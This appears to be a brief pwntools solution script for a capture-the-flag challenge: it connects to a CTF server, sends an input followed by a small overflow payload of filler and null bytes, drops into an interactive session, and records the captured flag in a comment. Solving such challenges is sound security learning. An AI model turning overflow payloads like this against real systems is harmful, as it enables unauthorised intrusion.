from pwn import *
context.log_level = 'debug'

e = context.binary = ELF('./challenge', checksec=False)
# libc = ELF('libc-2.27.so')
lib = e.libc

# r=e.process()
r = remote("chal.osugaming.lol", 7279)

r.sendline(b"727")

r.sendline(b"a"*16+b"\x00"*8)

r.interactive()

# osu{i_cant_believe_i_saw_it}